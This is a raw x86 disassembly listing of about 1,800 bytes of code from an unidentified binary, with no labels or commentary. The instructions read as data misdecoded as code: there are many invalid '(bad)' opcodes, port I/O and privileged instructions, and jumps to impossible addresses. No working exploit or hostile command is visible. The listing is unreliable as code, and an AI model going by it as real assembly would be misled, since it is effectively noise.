  40ccdc:	xchg   BYTE PTR ds:0x68bcb01,bl
  40cce2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cce3:	and    eax,esp
  40cce5:	ins    BYTE PTR es:[edi],dx
  40cce6:	(bad)  
  40cce8:	gs push 0xffffff84
  40cceb:	sbb    eax,0xda628c63
  40ccf0:	xlat   BYTE PTR ds:[ebx]
  40ccf1:	out    dx,al
  40ccf2:	adc    BYTE PTR [ebp-0x16],0xda
  40ccf6:	add    DWORD PTR [eax-0x397c786c],eax
  40ccfc:	(bad)  
  40ccfd:	jo     0x40cd2e
  40ccff:	mov    ebp,0x498ef0b5
  40cd04:	ja     0x40ccd7
  40cd06:	ds jge 0x40cd3b
  40cd09:	mov    bh,bl
  40cd0b:	in     al,dx
  40cd0c:	push   0x21568d0b
  40cd11:	jae    0x40ccfb
  40cd13:	push   ebx
  40cd14:	xchg   ecx,eax
  40cd15:	jp     0x40cd1d
  40cd17:	pop    ds
  40cd18:	ja     0x40cd27
  40cd1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd1b:	add    BYTE PTR [esi],ch
  40cd1d:	or     DWORD PTR [eax],esi
  40cd1f:	in     al,0x25
  40cd21:	leave  
  40cd22:	adc    ecx,DWORD PTR [ecx+edi*1]
  40cd25:	jl     0x40cd02
  40cd27:	jecxz  0x40cd64
  40cd29:	xor    DWORD PTR [ebx+0x47],esi
  40cd2c:	dec    eax
  40cd2d:	pusha  
  40cd2e:	or     ebx,DWORD PTR [ebx]
  40cd30:	push   ebp
  40cd31:	ds cwde 
  40cd33:	mov    dl,0x17
  40cd35:	add    eax,0x784d6f71
  40cd3a:	mov    DWORD PTR [edx],0x343214ed
  40cd40:	rcl    BYTE PTR [eax-0x1e],cl
  40cd43:	stos   BYTE PTR es:[edi],al
  40cd44:	popf   
  40cd45:	add    bl,BYTE PTR [ecx+0xd]
  40cd48:	jmp    FWORD PTR [ecx+0x45]
  40cd4b:	loope  0x40cd0d
  40cd4d:	mov    dl,0x89
  40cd4f:	jae    0x40cd38
  40cd51:	mov    WORD PTR [esp+edi*2],ss
  40cd54:	outs   dx,BYTE PTR ds:[esi]
  40cd55:	push   edx
  40cd56:	jae    0x40cd35
  40cd58:	pop    ecx
  40cd59:	mov    bh,0x4c
  40cd5b:	cmp    al,0x2e
  40cd5d:	jl     0x40cda4
  40cd5f:	scas   eax,DWORD PTR es:[edi]
  40cd60:	pushf  
  40cd61:	ds loope 0x40cd32
  40cd64:	xor    al,0x17
  40cd66:	and    eax,0xc70989a5
  40cd6b:	push   es
  40cd6c:	adc    bh,al
  40cd6e:	xor    esi,DWORD PTR gs:[edx]
  40cd71:	mov    ebx,0xc4a0db46
  40cd76:	push   eax
  40cd77:	sbb    dl,BYTE PTR [ecx]
  40cd79:	in     eax,dx
  40cd7a:	sub    edx,ebp
  40cd7c:	jg     0x40cd14
  40cd7e:	and    dh,BYTE PTR [ebx+edx*8+0x57fac40f]
  40cd85:	dec    edx
  40cd86:	add    ebx,DWORD PTR [esi-0x32bca8f5]
  40cd8c:	inc    esi
  40cd8d:	cmp    bl,BYTE PTR [eax]
  40cd8f:	mov    DWORD PTR [edi-0x63851294],0x4d0f95b
  40cd99:	xor    eax,0x368c726d
  40cd9e:	sbb    ecx,DWORD PTR [ecx-0x6e]
  40cda1:	out    0x34,al
  40cda3:	outs   dx,BYTE PTR ds:[esi]
  40cda4:	xchg   ecx,eax
  40cda5:	mov    ecx,DWORD PTR [ebx-0x58bbf147]
  40cdab:	data16 jbe 0x40cd4a
  40cdae:	cmp    BYTE PTR [eax-0x6b38b05f],al
  40cdb4:	inc    edx
  40cdb5:	sub    al,0x6f
  40cdb7:	add    eax,0xa1797721
  40cdbc:	adc    DWORD PTR [eax],esp
  40cdbe:	rcl    BYTE PTR [eax-0x60],1
  40cdc1:	add    al,0x4
  40cdc3:	or     eax,0x154f04bd
  40cdc8:	int3   
  40cdc9:	or     eax,0x50b47760
  40cdce:	aaa    
  40cdcf:	and    DWORD PTR [esi-0x71],eax
  40cdd2:	test   esi,esi
  40cdd4:	mov    esp,0x8c485279
  40cdd9:	stos   DWORD PTR es:[edi],eax
  40cdda:	adc    BYTE PTR [edx-0x45b0f070],ah
  40cde0:	(bad)
  40cde3:	sub    al,0xdf
  40cde5:	ss or  eax,0x68885c8f
  40cdeb:	fld    DWORD PTR [ecx+0x1]
  40cdee:	div    BYTE PTR [esp+eiz*2]
  40cdf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdf2:	or     BYTE PTR [eax+0x6b],0xcc
  40cdf6:	ss aas 
  40cdf8:	lea    eax,[edx-0x420f5d57]
  40cdfe:	xchg   edx,eax
  40cdff:	aad    0x22
  40ce01:	xlat   BYTE PTR ds:[ebx]
  40ce02:	jb     0x40cdb0
  40ce04:	push   es
  40ce05:	dec    esi
  40ce06:	hlt    
  40ce07:	dec    eax
  40ce08:	fcom   DWORD PTR [ebx]
  40ce0a:	(bad)  
  40ce0b:	mul    DWORD PTR [edi+0x56]
  40ce0e:	cdq    
  40ce0f:	pop    edi
  40ce10:	les    ebx,FWORD PTR [eax-0x2e]
  40ce13:	(bad)  
  40ce14:	push   ebp
  40ce15:	sbb    DWORD PTR ds:0x6a7155c,ebx
  40ce1b:	int3   
  40ce1c:	pusha  
  40ce1d:	sbb    eax,0x57ee85e
  40ce22:	in     eax,dx
  40ce23:	and    eax,0x3a2772fe
  40ce28:	lds    edi,FWORD PTR [ecx-0x52]
  40ce2b:	fdecstp 
  40ce2d:	mov    ah,0x9d
  40ce2f:	(bad)  [edx+esi*4-0x20]
  40ce33:	mov    ah,BYTE PTR [ecx-0xb]
  40ce36:	push   0x45
  40ce38:	pause  
  40ce3a:	dec    esp
  40ce3b:	lds    ecx,FWORD PTR [ecx]
  40ce3d:	mov    bl,0xc7
  40ce3f:	outs   dx,BYTE PTR ds:[esi]
  40ce40:	adc    dl,bl
  40ce42:	hlt    
  40ce43:	popa   
  40ce44:	rcl    BYTE PTR [ebx+0x27ed95d6],0x17
  40ce4b:	hlt    
  40ce4c:	push   edx
  40ce4d:	push   edi
  40ce4e:	sub    BYTE PTR [eax],cl
  40ce50:	pop    esp
  40ce51:	mov    bh,0x73
  40ce53:	dec    esp
  40ce54:	stos   DWORD PTR es:[edi],eax
  40ce55:	int3   
  40ce56:	jle    0x40cea8
  40ce58:	inc    ecx
  40ce59:	imul   eax,DWORD PTR [ecx-0x5891d0c3],0x6171abc1
  40ce63:	je     0x40ce7d
  40ce65:	pop    edi
  40ce66:	cli    
  40ce67:	mov    cs,WORD PTR [ebp-0x6cf56498]
  40ce6d:	cld    
  40ce6e:	xchg   ebp,eax
  40ce6f:	mov    eax,ds:0xe85b788c
  40ce74:	push   ecx
  40ce75:	shl    BYTE PTR [esi+0x648dc99c],cl
  40ce7b:	cwde   
  40ce7c:	cmp    al,BYTE PTR [ebp-0x59]
  40ce7f:	xchg   esi,eax
  40ce80:	xchg   BYTE PTR [edi-0x42],bh
  40ce83:	mov    dl,0x18
  40ce85:	mov    cl,0x3c
  40ce87:	adc    BYTE PTR [eax],0x32
  40ce8a:	dec    eax
  40ce8b:	rcl    ebx,cl
  40ce8d:	sti    
  40ce8e:	jge    0x40cec5
  40ce90:	daa    
  40ce91:	mov    ah,0xbd
  40ce93:	push   ss
  40ce94:	sub    edx,DWORD PTR [eax-0x4f]
  40ce97:	mov    esi,DWORD PTR [esi+0x64]
  40ce9a:	pop    esp
  40ce9b:	push   cs
  40ce9c:	stos   BYTE PTR es:[edi],al
  40ce9d:	ret    0x6457
  40cea0:	xor    esp,edx
  40cea2:	jecxz  0x40cebd
  40cea4:	inc    ebp
  40cea5:	bound  esi,QWORD PTR [edx]
  40cea7:	out    dx,eax
  40cea8:	lahf   
  40cea9:	pusha  
  40ceaa:	dec    ebp
  40ceab:	outs   dx,BYTE PTR ds:[esi]
  40ceac:	mov    WORD PTR [edx],es
  40ceae:	mov    ds:0xa4779689,al
  40ceb3:	js     0x40ce62
  40ceb5:	ror    BYTE PTR [edx],cl
  40ceb7:	push   edx
  40ceb8:	pop    eax
  40ceb9:	mov    esi,0x3272ec
  40cebe:	jmp    0x40f242
  40cec3:	mov    cs:0xd0afdcaf,eax
  40cec9:	add    DWORD PTR [ebx+0x287882c5],eax
  40cecf:	dec    esi
  40ced0:	mov    eax,ds:0xcdad4c03
  40ced5:	jp     0x40cf51
  40ced7:	adc    ebx,DWORD PTR [edi+0x7a]
  40ceda:	jp     0x40ce9e
  40cedc:	jbe    0x40cec2
  40cede:	xchg   esi,eax
  40cedf:	add    dl,ah
  40cee1:	or     DWORD PTR [ebx+0x3e],0xcd879311
  40cee8:	sbb    eax,0xf2371497
  40ceed:	and    eax,0xc576fd5a
  40cef2:	jl     0x40cf1f
  40cef4:	hlt    
  40cef5:	leave  
  40cef6:	popf   
  40cef7:	pop    edi
  40cef8:	into   
  40cef9:	(bad)  
  40cefa:	test   al,0x93
  40cefc:	push   0xffffffd5
  40cefe:	or     DWORD PTR [edx-0x5f],ebp
  40cf01:	and    al,0x64
  40cf03:	and    DWORD PTR [eax],esp
  40cf05:	js     0x40cf59
  40cf07:	xchg   BYTE PTR [ebx+0x70],cl
  40cf0a:	jl     0x40cf47
  40cf0c:	lea    esi,[ecx+ecx*2]
  40cf0f:	rcl    dh,0x3d
  40cf12:	pusha  
  40cf13:	or     edi,esi
  40cf15:	in     eax,0x5e
  40cf17:	out    dx,al
  40cf18:	ja     0x40cf50
  40cf1a:	xchg   DWORD PTR [esp+ecx*2],esp
  40cf1d:	mov    ebx,0xe6031cbd
  40cf22:	aaa    
  40cf23:	hlt    
  40cf24:	adc    eax,0x68b22cde
  40cf29:	bound  esi,QWORD PTR [edx-0x5a93076f]
  40cf2f:	cmc    
  40cf30:	pop    es
  40cf31:	loopne 0x40cf4b
  40cf33:	pusha  
  40cf34:	jmp    0x40cf31
  40cf36:	jne    0x40cf27
  40cf38:	fisubr WORD PTR [eax-0x19]
  40cf3b:	test   DWORD PTR [ebx+0x7d],0x9c54aee3
  40cf42:	dec    esi
  40cf43:	fadd   st,st(4)
  40cf45:	(bad)  
  40cf46:	(bad)
  40cf49:	pop    ebx
  40cf4a:	test   eax,0xff3e7e3c
  40cf4f:	xchg   DWORD PTR [esi],ebx
  40cf51:	inc    edi
  40cf52:	rcl    bh,1
  40cf54:	lea    edx,[ebx-0x30]
  40cf57:	sub    al,0xea
  40cf59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf5a:	rcl    BYTE PTR [esi+edx*8],1
  40cf5d:	cmovbe ecx,DWORD PTR [eax]
  40cf60:	outs   dx,BYTE PTR ds:[esi]
  40cf61:	jp     0x40cf14
  40cf63:	lods   al,BYTE PTR ds:[esi]
  40cf64:	mov    al,0x1a
  40cf66:	add    BYTE PTR [edi-0x2b],dh
  40cf69:	xchg   ecx,eax
  40cf6a:	icebp  
  40cf6b:	mov    ch,0xb3
  40cf6d:	test   DWORD PTR [eax+ebx*1-0x46],edx
  40cf71:	add    bl,BYTE PTR cs:[edx-0x40ae1c9d]
  40cf78:	fisttp DWORD PTR [eax]
  40cf7a:	int3   
  40cf7b:	pop    eax
  40cf7c:	xchg   edx,eax
  40cf7d:	fcomp  st(1)
  40cf7f:	aaa    
  40cf80:	pop    edx
  40cf81:	sbb    bh,ah
  40cf83:	adc    dl,cl
  40cf85:	fisttp DWORD PTR [esi+0xaeec8dc]
  40cf8b:	mov    ds:0xdaa043fc,eax
  40cf90:	outs   dx,DWORD PTR ds:[esi]
  40cf91:	in     al,0xc8
  40cf93:	push   edi
  40cf94:	imul   ecx,DWORD PTR [esi],0xdf4e3351
  40cf9a:	jb     0x40cff4
  40cf9c:	bound  eax,QWORD PTR ds:0xe5ee1b6d
  40cfa2:	cmc    
  40cfa3:	push   esi
  40cfa4:	jb     0x40cf53
  40cfa6:	popa   
  40cfa7:	ja     0x40cf7a
  40cfa9:	loop   0x40d019
  40cfab:	mov    esp,0xa30d9b0f
  40cfb0:	xchg   edx,eax
  40cfb1:	cdq    
  40cfb2:	cmp    al,0x9d
  40cfb4:	loop   0x40d023
  40cfb6:	sar    BYTE PTR ds:0x86b9f120,0xd6
  40cfbd:	adc    BYTE PTR [edx],dl
  40cfbf:	sahf   
  40cfc0:	sbb    al,0xaf
  40cfc2:	or     eax,0xc7f989ba
  40cfc7:	xchg   edi,eax
  40cfc8:	sub    BYTE PTR [edx],ch
  40cfca:	push   es
  40cfcb:	sub    eax,0xc1851c93
  40cfd0:	inc    eax
  40cfd1:	push   ds
  40cfd2:	aam    0x47
  40cfd4:	and    cl,ch
  40cfd6:	pop    ecx
  40cfd7:	jg     0x40cf90
  40cfd9:	aad    0xe7
  40cfdb:	sti    
  40cfdc:	and    al,0xe0
  40cfde:	jb     0x40d04b
  40cfe0:	push   DWORD PTR [edi-0x555da99f]
  40cfe6:	adc    eax,DWORD PTR [ebp-0x63965f57]
  40cfec:	ror    DWORD PTR [ebp+0x5ac700a2],1
  40cff2:	imul   eax,DWORD PTR [eax-0x55],0xf87704b8
  40cff9:	loopne 0x40cfc5
  40cffb:	(bad)  
  40cffc:	cmp    bl,BYTE PTR [edi+esi*4+0x3d47a4cf]
  40d003:	aas    
  40d004:	cdq    
  40d005:	adc    BYTE PTR [ebp+0x579f985],0x4
  40d00c:	sub    BYTE PTR [edi+0x1],cl
  40d00f:	xchg   esp,esi
  40d011:	ds (bad) 
  40d013:	mov    bh,0x24
  40d015:	mov    ds:0x576af00a,al
  40d01a:	lods   eax,DWORD PTR ds:[esi]
  40d01b:	jle    0x40d02a
  40d01d:	es xor ebx,edx
  40d020:	lea    ebx,[edi+0x1c]
  40d023:	sub    eax,0x5804fc68
  40d028:	pop    edi
  40d029:	mov    eax,ds:0x6f03d799
  40d02e:	leave  
  40d02f:	cdq    
  40d030:	out    dx,al
  40d031:	and    al,0xa4
  40d033:	cs (bad) 
  40d035:	xchg   di,ax
  40d037:	lods   eax,DWORD PTR ds:[esi]
  40d038:	hlt    
  40d039:	les    ebp,FWORD PTR [ecx-0x22]
  40d03c:	ss inc esi
  40d03e:	and    edi,DWORD PTR [esi]
  40d040:	and    ah,cl
  40d042:	ds loope 0x40d022
  40d045:	inc    esi
  40d046:	cld    
  40d047:	(bad)  
  40d048:	push   ss
  40d049:	scas   eax,DWORD PTR es:[edi]
  40d04a:	shr    al,cl
  40d04c:	scas   al,BYTE PTR es:[edi]
  40d04d:	imul   edx,DWORD PTR [ebx+0x2ddb9421],0x599ec483
  40d057:	inc    esp
  40d058:	mov    al,0xb1
  40d05a:	jbe    0x40d029
  40d05c:	shl    DWORD PTR [edx+0x70],0x61
  40d060:	aad    0xab
  40d062:	pop    edi
  40d063:	pop    ss
  40d064:	test   al,0x63
  40d066:	and    edi,eax
  40d068:	in     al,dx
  40d069:	test   eax,0x39255201
  40d06e:	fsubp  st(4),st
  40d070:	jo     0x40d064
  40d072:	jnp    0x40d0e8
  40d074:	(bad)  
  40d075:	loop   0x40d090
  40d077:	xor    eax,0xabb09126
  40d07c:	xor    dl,BYTE PTR [ecx]
  40d07e:	push   edx
  40d07f:	rol    DWORD PTR [ecx],cl
  40d081:	and    eax,0x164e66a8
  40d086:	sbb    bl,ch
  40d088:	cmp    edi,eax
  40d08a:	inc    ecx
  40d08b:	push   esp
  40d08c:	xchg   DWORD PTR [edi-0x1d],edx
  40d08f:	pop    esi
  40d090:	mov    ds:0xa502ffe7,al
  40d095:	fcmovnb st,st(1)
  40d097:	pushf  
  40d098:	ss mov ebx,esi
  40d09b:	adc    ch,BYTE PTR [ebp-0xa2ced2c]
  40d0a1:	mov    ds:0x6d4975d9,al
  40d0a6:	adc    eax,0x30cb0732
  40d0ab:	out    0x1f,al
  40d0ad:	push   ecx
  40d0ae:	xchg   ecx,eax
  40d0af:	add    eax,0xe9a0267a
  40d0b4:	xor    bh,BYTE PTR [eax]
  40d0b6:	fsub   st,st(0)
  40d0b8:	js     0x40d0f3
  40d0ba:	shl    BYTE PTR [ecx+0x285820c4],cl
  40d0c0:	jecxz  0x40d11a
  40d0c2:	xor    eax,0xa1fc9441
  40d0c7:	dec    eax
  40d0c8:	push   eax
  40d0c9:	pop    ds
  40d0ca:	gs cmp al,0xdb
  40d0cd:	xchg   ebx,eax
  40d0ce:	xor    BYTE PTR [ebx],dh
  40d0d0:	call   0x9b8b4607
  40d0d5:	pop    edx
  40d0d6:	mov    ch,0x3e
  40d0d8:	mov    dl,BYTE PTR [ecx]
  40d0da:	fadd   DWORD PTR ds:0x6c883ce5
  40d0e0:	ins    BYTE PTR es:[edi],dx
  40d0e1:	jle    0x40d0b4
  40d0e3:	cld    
  40d0e4:	xchg   ebp,eax
  40d0e5:	jnp    0x40d082
  40d0e7:	je     0x40d0b1
  40d0e9:	dec    edi
  40d0ea:	dec    ebx
  40d0eb:	dec    ecx
  40d0ec:	jno    0x40d0c3
  40d0ee:	call   0xb9df6418
  40d0f3:	pop    ecx
  40d0f4:	jle    0x40d0d3
  40d0f6:	test   eax,0xc7bb454
  40d0fb:	loopne 0x40d15f
  40d0fd:	retf   0x1142
  40d100:	cmp    eax,0xdc07db46
  40d105:	loop   0x40d0e0
  40d107:	bound  edi,QWORD PTR [ecx+0x24]
  40d10a:	dec    ecx
  40d10b:	and    BYTE PTR [ebx],bh
  40d10d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d10e:	cs iret 
  40d110:	bound  ebp,QWORD PTR [ecx]
  40d112:	imul   esp,DWORD PTR ds:0xd3bd82ea,0xffffffce
  40d119:	xchg   esi,eax
  40d11a:	jns    0x40d0fa
  40d11c:	sahf   
  40d11d:	pop    ecx
  40d11e:	cs jle 0x40d189
  40d121:	outs   dx,BYTE PTR ds:[esi]
  40d122:	fcomp  DWORD PTR [edi+0x3a8132c4]
  40d128:	jmp    0x40d119
  40d12a:	dec    edx
  40d12b:	dec    ebp
  40d12c:	out    dx,al
  40d12d:	push   ds
  40d12e:	es stc 
  40d130:	imul   esp,DWORD PTR [edx+0x61f3306d],0x37
  40d137:	outs   dx,DWORD PTR ds:[esi]
  40d138:	jne    0x40d1ad
  40d13a:	mov    ebp,0x41b36b97
  40d13f:	dec    ecx
  40d140:	pop    ds
  40d141:	popa   
  40d142:	inc    edx
  40d143:	clc    
  40d144:	xor    BYTE PTR [esi+0x711236f9],bh
  40d14a:	dec    eax
  40d14b:	mov    ebp,0xadfeea51
  40d150:	fistp  WORD PTR [ecx+0xb]
  40d153:	and    al,0x9f
  40d155:	pcmpgtw mm7,mm0
  40d158:	sbb    DWORD PTR [ebx+edx*4],0x7c24996e
  40d15f:	aam    0xe8
  40d161:	fst    QWORD PTR [esi-0x5e]
  40d164:	lods   al,BYTE PTR ds:[esi]
  40d165:	xor    al,BYTE PTR [edx]
  40d167:	sub    al,0x35
  40d169:	xchg   edx,eax
  40d16a:	mov    ch,0x2a
  40d16c:	adc    ebp,DWORD PTR [ebx-0x46]
  40d16f:	sub    DWORD PTR [eax],0x9353ed7c
  40d175:	adc    esp,DWORD PTR [edx+ecx*2-0x23]
  40d179:	sub    BYTE PTR [edx-0x3a436cb2],0x60
  40d180:	inc    edx
  40d181:	stos   BYTE PTR es:[edi],al
  40d182:	clc    
  40d183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d184:	cmp    eax,0x2784be63
  40d189:	gs pop ebp
  40d18b:	mov    dh,ch
  40d18d:	call   0xd1f0af4e
  40d192:	mov    eax,ds:0x8c405221
  40d197:	sub    ah,BYTE PTR [ebx-0x182ebcfd]
  40d19d:	cwde   
  40d19e:	int    0xa8
  40d1a0:	xchg   edx,eax
  40d1a1:	xchg   ah,al
  40d1a3:	jle    0x40d17d
  40d1a5:	je     0x40d218
  40d1a7:	mov    ds:0xd3e3fe1,eax
  40d1ac:	lds    edx,FWORD PTR [esi]
  40d1ae:	(bad)  
  40d1af:	hlt    
  40d1b0:	jnp    0x40d1c6
  40d1b2:	sub    bl,al
  40d1b4:	jmp    0xc89e:0x9a5f1bc7
  40d1bb:	std    
  40d1bc:	clc    
  40d1bd:	or     eax,0x8536c09
  40d1c2:	mov    eax,ds:0x2ac6b9a7
  40d1c7:	pop    edx
  40d1c8:	pop    esp
  40d1c9:	inc    edi
  40d1ca:	and    eax,DWORD PTR [eax+eiz*1]
  40d1cd:	(bad)  
  40d1ce:	stc    
  40d1cf:	xchg   ebp,eax
  40d1d0:	xchg   edi,eax
  40d1d1:	cmp    ebx,ebp
  40d1d3:	mov    cl,0xf1
  40d1d5:	xlat   BYTE PTR gs:[ebx]
  40d1d7:	repz loopne 0x40d169
  40d1da:	(bad)  
  40d1db:	js     0x40d160
  40d1dd:	call   0xaccb74ed
  40d1e2:	pop    eax
  40d1e3:	pop    eax
  40d1e4:	mov    cl,0x3
  40d1e6:	enter  0xb393,0x77
  40d1ea:	inc    ebp
  40d1eb:	in     eax,dx
  40d1ec:	jecxz  0x40d224
  40d1ee:	and    BYTE PTR [ebp-0x53596986],al
  40d1f4:	(bad)  
  40d1f6:	cwde   
  40d1f7:	mov    eax,0x257699b6
  40d1fc:	jne    0x40d24a
  40d1fe:	mov    ebx,0x73a3bab1
  40d203:	and    ebx,edx
  40d205:	fistp  DWORD PTR [eax-0x1af0a0fc]
  40d20b:	mov    ecx,0x8322e81a
  40d210:	ficomp DWORD PTR [ecx+ecx*8-0x30]
  40d214:	mov    eax,ds:0x4ecc5599
  40d219:	arpl   WORD PTR [ebp+0x4a],ax
  40d21c:	lods   al,BYTE PTR ds:[esi]
  40d21d:	sub    ah,BYTE PTR [eax+ebp*4+0x7fb20244]
  40d224:	retf   0x1905
  40d227:	lahf   
  40d228:	cmp    edx,DWORD PTR [ebp+0x6b]
  40d22b:	out    0x5a,eax
  40d22d:	cmp    DWORD PTR [ebx+0x67],0x1db5c2bd
  40d234:	mov    ebx,DWORD PTR [esi+0x12965240]
  40d23a:	(bad)  
  40d23b:	pop    edx
  40d23c:	sti    
  40d23d:	pop    esi
  40d23e:	clc    
  40d23f:	adc    eax,DWORD PTR [edi-0x2]
  40d242:	in     al,dx
  40d243:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d244:	cli    
  40d245:	push   ecx
  40d246:	std    
  40d247:	out    0xf,al
  40d249:	jmp    0xe3d04c81
  40d24e:	mov    esi,0xf8a77125
  40d253:	mov    ebp,0x55a85a2
  40d258:	mov    ecx,0xeeffcf87
  40d25d:	cdq    
  40d25e:	cs push edi
  40d260:	adc    BYTE PTR [edi+0x68e85165],ch
  40d266:	mov    DWORD PTR [eax-0x6b6482da],edi
  40d26c:	sbb    ch,BYTE PTR [eax+0x13]
  40d26f:	adc    bl,BYTE PTR [edi]
  40d271:	out    dx,al
  40d272:	mul    BYTE PTR ss:[ecx]
  40d275:	repnz adc al,0x36
  40d278:	stc    
  40d279:	ins    BYTE PTR es:[edi],dx
  40d27a:	inc    ecx
  40d27b:	out    0x5,eax
  40d27d:	(bad)  
  40d27e:	dec    ebp
  40d27f:	pop    eax
  40d280:	add    al,0xe9
  40d282:	out    dx,eax
  40d283:	icebp  
  40d284:	pop    edx
  40d285:	adc    al,BYTE PTR [ebp+0x57898d2b]
  40d28b:	and    BYTE PTR [eax+edx*4-0x4bb606fb],ah
  40d292:	sti    
  40d293:	sub    edi,DWORD PTR [ebp+0x2b]
  40d296:	inc    BYTE PTR [ecx-0x55]
  40d299:	mov    BYTE PTR [ebp-0x2dab7dc],dl
  40d29f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2a0:	lock das 
  40d2a2:	add    cl,BYTE PTR [ebx+0x35]
  40d2a5:	or     al,BYTE PTR [ebx]
  40d2a7:	xor    esi,ebx
  40d2a9:	mov    cl,0x2f
  40d2ab:	syscall 
  40d2ad:	ins    BYTE PTR es:[edi],dx
  40d2ae:	in     eax,0x3e
  40d2b0:	sti    
  40d2b1:	shl    BYTE PTR [ebx],0x35
  40d2b4:	loop   0x40d2de
  40d2b6:	jo     0x40d2b3
  40d2b8:	pop    ds
  40d2b9:	pop    ds
  40d2ba:	dec    ebp
  40d2bb:	fadd   DWORD PTR [ebx]
  40d2bd:	fimul  WORD PTR [edx+0x27]
  40d2c0:	leave  
  40d2c1:	(bad)  
  40d2c3:	adc    ah,0xc
  40d2c6:	xor    ah,BYTE PTR [esi-0x7f7d6adb]
  40d2cc:	push   esp
  40d2cd:	xlat   BYTE PTR ds:[ebx]
  40d2ce:	mov    dl,0x39
  40d2d0:	dec    DWORD PTR [eax+0x6f]
  40d2d3:	data16 adc ah,bh
  40d2d6:	std    
  40d2d7:	bound  esi,QWORD PTR [ecx]
  40d2d9:	xchg   edx,eax
  40d2da:	adc    eax,0x1e972f03
  40d2df:	cli    
  40d2e0:	in     al,dx
  40d2e1:	(bad)  [edx]
  40d2e3:	loope  0x40d312
  40d2e5:	sbb    ah,bl
  40d2e7:	fadd   DWORD PTR [edx-0x41]
  40d2ea:	retf   0x1bbb
  40d2ed:	fcmovnu st,st(6)
  40d2ef:	jmp    0x40d350
  40d2f1:	(bad)  
  40d2f2:	std    
  40d2f3:	adc    BYTE PTR [ebx],ch
  40d2f5:	nop
  40d2f6:	pop    ebx
  40d2f7:	mov    bh,0x38
  40d2f9:	fwait
  40d2fa:	daa    
  40d2fb:	cdq    
  40d2fc:	adc    al,0x3f
  40d2fe:	mov    eax,0x6212507b
  40d303:	test   eax,0xbe63b274
  40d308:	rcl    edi,0xc8
  40d30b:	add    al,0xd2
  40d30d:	pop    esp
  40d30e:	imul   eax,DWORD PTR [edx],0x1b
  40d311:	loopne 0x40d2eb
  40d313:	aad    0x7c
  40d315:	rol    BYTE PTR [ecx-0x1f5fc008],cl
  40d31b:	sub    ecx,DWORD PTR [esi+0x741119dd]
  40d321:	jge    0x40d349
  40d323:	mov    WORD PTR [ebx-0x69],ss
  40d326:	pusha  
  40d327:	dec    esp
  40d328:	sbb    ecx,DWORD PTR [ecx]
  40d32a:	pop    ss
  40d32b:	sub    ebp,esp
  40d32d:	jno    0x40d32f
  40d32f:	xchg   edi,eax
  40d330:	sub    DWORD PTR [edi+eax*2+0x4cbed312],ebp
  40d337:	cmp    al,0xba
  40d339:	sbb    ebp,DWORD PTR ds:0x6bd5ae76
  40d33f:	cmp    cl,al
  40d341:	cmp    esi,DWORD PTR [ebx]
  40d343:	test   DWORD PTR [ecx-0x3e],eax
  40d346:	adc    BYTE PTR [ecx+ebx*2-0x6cabd5c5],dh
  40d34d:	scas   eax,DWORD PTR es:[edi]
  40d34e:	mov    ah,0xe7
  40d350:	jne    0x40d38e
  40d352:	cwde   
  40d353:	add    edx,ebp
  40d355:	imul   edx,DWORD PTR [esi-0x6a7995d],0xffffffbc
  40d35c:	jo     0x40d30b
  40d35e:	int3   
  40d35f:	mov    ?,ebp
  40d361:	int    0xff
  40d363:	iret   
  40d364:	das    
  40d365:	loopne 0x40d3d2
  40d367:	jg     0x40d323
  40d369:	inc    eax
  40d36a:	pusha  
  40d36b:	dec    ecx
  40d36c:	jl     0x40d3e8
  40d36e:	cmp    ecx,edi
  40d370:	ret    
  40d371:	ret    0x18a0
  40d374:	out    0x3d,eax
  40d376:	jp     0x40d3df
  40d378:	sbb    eax,0xc99729a1
  40d37d:	cmp    DWORD PTR [esi],edi
  40d37f:	mov    eax,ds:0xb48ca41
  40d384:	mov    DWORD PTR [ebx-0x50eb0fb0],ebp
  40d38a:	add    al,0xe4
  40d38c:	push   0xffffffd5
  40d38e:	adc    DWORD PTR [eax+0x55],eax
  40d391:	jns    0x40d407
  40d393:	adc    bh,BYTE PTR [ebp-0x5d]
  40d396:	xor    bh,BYTE PTR [eax]
  40d398:	or     DWORD PTR ds:0x7401c4ce,ebx
  40d39e:	outs   dx,DWORD PTR ds:[esi]
  40d39f:	out    dx,al
  40d3a0:	or     eax,0xc5418a30
  40d3a5:	mov    ecx,0xf4dc71e9
  40d3aa:	loopne 0x40d3b3
  40d3ac:	pop    esi
  40d3ad:	clc    
  40d3ae:	sub    BYTE PTR [edx],cl
  40d3b0:	push   ecx
  40d3b1:	fwait
  40d3b2:	cmp    edi,DWORD PTR [esp+eiz*4]
  40d3b5:	pop    ds
  40d3b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3b7:	fnsave [edi+0x5d67d907]
  40d3bd:	cwde   
  40d3be:	adc    cl,dl
  40d3c0:	fst    QWORD PTR [ecx+0x37]
  40d3c3:	das    
  40d3c4:	enter  0xf30a,0x80
  40d3c8:	std    
  40d3c9:	and    BYTE PTR [edx+0x2b],bh
  40d3cc:	xor    BYTE PTR [ecx],ch
  40d3ce:	mov    BYTE PTR [edx],dh
  40d3d0:	rcl    cl,cl
  40d3d2:	and    DWORD PTR [ebp+edi*2-0x3e],edx
  40d3d6:	fisttp WORD PTR [esi+0x33809ad8]
  40d3dc:	pop    es
  40d3dd:	sbb    DWORD PTR [ecx-0x7469f3f9],esp
  40d3e3:	mov    edi,0xb2295998
  40d3e8:	add    BYTE PTR [ecx+edx*4+0x4e29567e],cl
  40d3ef:	fs mov ecx,0xae85d16d
  40d3f5:	pop    edx
  40d3f6:	pop    edi
  40d3f7:	pop    ds
  40d3f8:	push   eax
  40d3f9:	dec    ebx
  40d3fa:	mov    bl,0x9d
  40d3fc:	lds    eax,FWORD PTR [eax+0x1c7eaacc]
  40d402:	call   0x5be2:0x6c94c2d3
  40d409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d40a:	push   edx
  40d40b:	mov    ebp,0xb996fc80
  40d410:	(bad)  
  40d411:	fwait
  40d412:	xchg   ebp,eax
  40d413:	cmp    cl,0xac
  40d416:	pop    ebx
